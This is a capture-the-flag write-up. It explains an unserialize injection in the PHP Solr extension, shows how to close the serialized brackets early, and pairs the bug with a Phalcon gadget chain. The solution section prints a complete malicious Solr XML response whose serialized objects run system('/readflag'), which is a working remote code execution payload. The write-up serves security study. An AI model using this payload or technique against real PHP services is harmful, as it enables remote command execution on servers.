# Soracon

My friend called me to mine a new 0day of Apache Solr, so I found this!

## Writeup

### Solr

We can control the Solr response now. If we read the solr extensions's source code, we will know it will convert XML response to PHP serialization format (https://github.com/php/pecl-search_engine-solr/blob/2.5.1/src/php7/php_solr_response.c#L239) then use `php_var_unserialize` to make `SolrObject`. 

And let us read the convert helper, the following code will convert `<int>123456</int>` to `i:12345` ( https://github.com/php/pecl-search_engine-solr/blob/2.5.1/src/php7/solr_functions_helpers.c#L1142 )

```c
/* {{{ static void solr_encode_int(const xmlNode *node, solr_string_t *buffer, solr_encoding_type_t enc_type, long int array_index, long int parse_mode) */
static void solr_encode_int(const xmlNode *node, solr_string_t *buffer, solr_encoding_type_t enc_type, long int array_index, long int parse_mode)
{
	solr_char_t *data_value = (solr_char_t *) solr_xml_get_node_contents(node);
	size_t data_value_len   = solr_strlen(data_value);
	solr_write_variable_opener(node, buffer, enc_type, array_index);
	solr_string_append_const(buffer, "i:");
	solr_string_appends(buffer, data_value, data_value_len);
	solr_string_appendc(buffer, ';');
}
/* }}} */
```

So we can do... UNSERIALIZE INJECTION! (wtf)

This is an example Solr reponse:
```xml
<?xml version="1.0" encoding="UTF-8"?>'
<response>
<result name="response" numFound="1" start="0" numFoundExact="true">
  <doc name="fuck">
    <int name="a">123456</int>
    <int name="b">12345678</int>
  </doc>
</result>
</response>
```

If we add a printf before https://github.com/php/pecl-search_engine-solr/blob/2.5.1/src/php7/php_solr_response.c#L290 , we will get the response like this:

```
O:10:"SolrObject":1:{s:8:"response";O:10:"SolrObject":3:{s:8:"numFound";i:1;s:5:"start";i:0;s:4:"docs";a:1:{i:0;O:10:"SolrObject":2:{s:1:"a";i:123456;s:1:"b";i:12345678;}}}}
```

You can't use `123456;i:0;i:1` like SQL injection to add a new element into `SolrObject`(Check ![var_unserializer.re](https://github.com/php/php-src/blob/php-7.4.20/ext/standard/var_unserializer.re) for detail), but you can manually close all brackets. PHP will stop reading all the remaining characters if unserialization is done(brackets are all closed).

```php
php > print_r(unserialize('a:2:{i:0;i:123456;i:1;i:12345678;}'));
Array
(
    [0] => 123456
    [1] => 12345678
)
php > print_r(unserialize('a:2:{i:0;i:123456;i:1;i:8888;}aabccdefg'));
Array
(
    [0] => 123456
    [1] => 8888
)
php > print_r(unserialize('i:12345678;aaadasjkda'));
12345678
```

Now we can unserialize all we needed.

### Phalcon unserialize gadget chain

I know somebody implemented PHP unserialize gadget auto mining tool, how to let it invalid? The simplest way is to find a gadget which not written in PHP. (wtf)

Phalcon is the best choice for this. It's written in Zephir and will be compiled to C. This chain is easy to find and read, so just see `chain.php`.


## Solution
Let your server respond this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<response>
<result name="response" numFound="1" start="0" numFoundExact="true">
  <doc name="fuck">
    <int name="a">12345678;i:0;O:29:"Phalcon\Logger\Adapter\Stream":8:{s:16:"defaultFormatter";s:4:"Json";s:9:"formatter";N;s:13:"inTransaction";b:1;s:5:"queue";a:1:{i:0;O:10:"Phalcon\Di":3:{s:8:"services";a:1:{s:7:"context";O:18:"Phalcon\Di\Service":4:{s:10:"definition";a:3:{s:9:"className";s:18:"Phalcon\Validation";s:9:"arguments";a:0:{}s:5:"calls";a:2:{i:0;a:2:{s:6:"method";s:3:"add";s:9:"arguments";a:2:{i:0;a:2:{s:4:"type";s:9:"parameter";s:5:"value";a:1:{i:0;s:0:"";}}i:1;a:2:{s:4:"type";s:9:"parameter";s:5:"value";O:37:"Phalcon\Validation\Validator\Callback":3:{s:9:"templates";a:0:{}s:7:"options";a:2:{s:7:"message";s:0:"";s:8:"callback";s:6:"system";}s:8:"template";s:0:"";}}}}i:1;a:2:{s:6:"method";s:8:"validate";s:9:"arguments";a:1:{i:0;a:2:{s:4:"type";s:9:"parameter";s:5:"value";O:21:"Phalcon\Acl\Component":2:{s:11:"description";s:0:"";s:4:"name";s:9:"/readflag";}}}}}}s:8:"resolved";b:0;s:6:"shared";b:0;s:14:"sharedInstance";N;}}s:15:"sharedInstances";a:0:{}s:13:"eventsManager";N;}}s:7:"handler";N;s:4:"mode";s:2:"ab";s:4:"name";s:10:"/tmp/1.txt";s:7:"options";N;}}}}}}</int>
    <int name="b">0</int>
  </doc>
  <fuck></fuck>
</result>
</response>
```